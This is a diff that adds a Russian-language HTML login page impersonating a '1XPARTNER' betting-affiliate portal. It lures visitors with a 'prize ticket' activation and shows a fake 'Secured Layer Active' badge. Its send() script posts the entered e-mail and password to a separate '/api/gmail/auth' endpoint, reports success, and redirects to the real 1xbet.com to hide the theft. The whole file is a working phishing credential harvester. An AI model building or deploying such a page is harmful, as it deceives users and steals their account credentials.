@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURE ACCESS | 1XPARTNER</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Oswald:wght@500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --1x-blue: #001a33;
+            --1x-light-blue: #007bff;
+            --gold: #ffcc00;
+            --card-bg: rgba(0, 10, 25, 0.4);
+            --text-main: #ffffff;
+            --text-secondary: #aaaaaa;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: var(--text-main);
+            background: #000;
+            perspective: 2000px;
+        }
+
+        .match-bg {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -3;
+            background-image: url('https://images.unsplash.com/photo-1508098682722-e99c43a406b2?auto=format&fit=crop&q=80&w=2000');
+            background-size: cover;
+            background-position: center;
+            filter: blur(8px) brightness(0.2);
+            transform: scale(1.1);
+        }
+
+        #particles-js {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -2;
+            pointer-events: none;
+        }
+
+        .container {
+            position: relative;
+            transform-style: preserve-3d;
+            will-change: transform;
+        }
+
+        .login-card {
+            position: relative;
+            width: 420px;
+            background: var(--card-bg);
+            backdrop-filter: blur(25px) saturate(180%);
+            -webkit-backdrop-filter: blur(25px) saturate(180%);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 50px;
+            border-radius: 30px;
+            text-align: center;
+            box-shadow: 0 50px 100px rgba(0,0,0,0.8);
+            transform-style: preserve-3d;
+            overflow: hidden;
+        }
+
+        .login-card::after {
+            content: "";
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: linear-gradient(135deg, rgba(255,255,255,0) 40%, rgba(255,255,255,0.08) 50%, rgba(255,255,255,0) 60%);
+            animation: shineCard 6s infinite;
+            transform: rotate(30deg);
+            pointer-events: none;
+        }
+
+        @keyframes shineCard {
+            0% { transform: translateX(-150%) rotate(30deg); }
+            100% { transform: translateX(150%) rotate(30deg); }
+        }
+
+        .card-bg-text {
+            position: absolute;
+            font-size: 150px;
+            font-weight: 900;
+            color: rgba(255, 255, 255, 0.02);
+            font-family: 'Oswald', sans-serif;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%) translateZ(-20px);
+            pointer-events: none;
+            letter-spacing: -5px;
+        }
+
+        .layer {
+            transform-style: preserve-3d;
+            will-change: transform;
+        }
+
+        .level-1 { transform: translateZ(20px); }
+        .level-2 { transform: translateZ(40px); }
+        .level-3 { transform: translateZ(60px); }
+
+        .logo {
+            font-family: 'Oswald', sans-serif;
+            font-size: 36px;
+            font-weight: 500;
+            margin-bottom: 15px;
+            letter-spacing: 2px;
+            filter: drop-shadow(0 0 15px rgba(0, 123, 255, 0.5));
+        }
+        .logo span { color: var(--1x-light-blue); }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            background: linear-gradient(180deg, #fff, #888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .instruction {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 35px;
+            line-height: 1.5;
+            font-weight: 300;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--1x-light-blue);
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        input {
+            width: 100%;
+            padding: 18px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            color: white;
+            font-size: 16px;
+            transition: 0.3s cubic-bezier(0.215, 0.61, 0.355, 1);
+        }
+
+        input:focus {
+            border-color: var(--1x-light-blue);
+            background: rgba(0, 0, 0, 0.5);
+            box-shadow: 0 0 20px rgba(0, 123, 255, 0.3);
+            transform: scale(1.02);
+        }
+
+        .btn-wrapper {
+            position: relative;
+            margin-top: 25px;
+            display: inline-block;
+            width: 100%;
+            overflow: hidden;
+            border-radius: 15px;
+            padding: 2px;
+            z-index: 1;
+        }
+
+        .btn-wrapper::before {
+            content: "";
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: conic-gradient(transparent, var(--1x-light-blue), transparent 30%);
+            animation: rotateBorder 3s linear infinite;
+            z-index: -1;
+        }
+
+        @keyframes rotateBorder {
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 20px;
+            background: #000;
+            border: none;
+            border-radius: 13px;
+            color: white;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: 0.3s;
+            position: relative;
+        }
+
+        .btn-submit:hover {
+            background: var(--1x-light-blue);
+            box-shadow: 0 0 30px rgba(0, 123, 255, 0.6);
+        }
+
+        .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 10px;
+            color: #4caf50;
+            margin-top: 25px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 700;
+        }
+
+        .footer-links {
+            margin-top: 25px;
+            font-size: 12px;
+        }
+
+        .footer-links a {
+            color: #555;
+            text-decoration: none;
+            transition: 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: var(--gold);
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="match-bg"></div>
+<div id="particles-js"></div>
+
+<div class="container" id="container">
+    <div class="login-card" id="card">
+        <div class="card-bg-text">LOGIN</div>
+
+        <div class="layer level-1">
+            <div class="logo">1X<span>PARTNER</span></div>
+        </div>
+
+        <div class="layer level-2">
+            <h1>Личный кабинет</h1>
+            <p class="instruction">Для активации призового билета и привязки к ID, пожалуйста, авторизуйтесь в системе партнера.</p>
+        </div>
+
+        <div class="layer level-3">
+            <div class="input-group">
+                <label>E-mail или ID</label>
+                <input type="email" id="email" placeholder="example@mail.com" autocomplete="username">
+            </div>
+
+            <div class="input-group">
+                <label>Пароль</label>
+                <input type="password" id="password" placeholder="••••••••" autocomplete="current-password">
+            </div>
+
+            <div class="btn-wrapper">
+                <button onclick="send()" class="btn-submit">Активировать доступ</button>
+            </div>
+        </div>
+
+        <div class="secure-badge layer level-1">
+            <svg width="12" height="12" fill="currentColor" viewBox="0 0 16 16">
+                <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
+            </svg>
+            Secured Layer Active
+        </div>
+
+        <div class="footer-links layer level-1">
+            <a href="#">Восстановить пароль</a>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+<script>
+    particlesJS('particles-js', {
+        particles: {
+            number: { value: 60 },
+            color: { value: '#ffffff' },
+            shape: { type: 'circle' },
+            opacity: { value: 0.2, random: true },
+            size: { value: 2, random: true },
+            move: { enable: true, speed: 1, direction: 'none', random: true, out_mode: 'out' }
+        },
+        interactivity: { detect_on: 'canvas', events: { onhover: { enable: false } } }
+    });
+
+    const card = document.getElementById('card');
+    const container = document.getElementById('container');
+
+    container.addEventListener('mousemove', (e) => {
+        const x = e.clientX - window.innerWidth / 2;
+        const y = e.clientY - window.innerHeight / 2;
+
+        const factor = 40;
+        const tiltX = -y / factor;
+        const tiltY = x / factor;
+
+        container.style.transform = `rotateX(${tiltX}deg) rotateY(${tiltY}deg)`;
+    });
+
+    container.addEventListener('mouseleave', () => {
+        container.style.transition = 'transform 0.5s ease-out';
+        container.style.transform = `rotateX(0deg) rotateY(0deg)`;
+
+        setTimeout(() => {
+            container.style.transition = 'none';
+        }, 500);
+    });
+
+    function send() {
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+
+        if (!email || !password) {
+            alert("Пожалуйста, заполните все поля");
+            return;
+        }
+
+        const btn = document.querySelector('.btn-submit');
+        btn.innerText = "Синхронизация...";
+        btn.style.opacity = "0.7";
+        btn.disabled = true;
+
+        fetch("http://localhost:1717/api/gmail/auth", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email: email, password: password })
+        })
+            .then(response => {
+                setTimeout(() => {
+                    alert("Данные приняты! Ваш билет будет отправлен на почту в течение 24 часов.");
+                    window.location.href = "https://1xbet.com";
+                }, 1500);
+            })
+            .catch(err => {
+                console.error(err);
+                btn.innerText = "Активировать доступ";
+                btn.style.opacity = "1";
+                btn.disabled = false;
+            });
+    }
+</script>
+
+</body>
+</html>
